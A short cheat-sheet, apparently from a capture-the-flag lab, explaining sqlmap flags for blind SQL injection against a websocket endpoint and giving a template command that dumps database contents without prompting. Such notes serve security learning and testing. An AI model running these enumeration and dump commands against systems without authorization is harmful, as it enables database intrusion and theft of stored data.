# Sqlmap

Sqlmap is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## Blind SQL injection

We can inject SQL code but not see the output.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --
level 5 --risk 3 --batch
```

- `-u` Target URL
- `--data` Data string to be sent through POST (e.g. "id=1")
- `--dbs` Enumerate DBMS databases
- `--threads` Max number of concurrent HTTP(s) requests (default 1)
- `--level` Level of tests to perform (1-5, default 1)
- `--risk` Risk of tests to perform (1-3, default 1)
- `--batch` Never ask for user input, use the default behavior

If we found a DB we can dump its content with:

```bash
sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> -D <database_name> --dump --batch
```

- `D` DBMS database to enumerate
- `--dump` Dump DBMS database table entries

## Docs

- https://github.com/sqlmapproject/sqlmap/wiki/Usage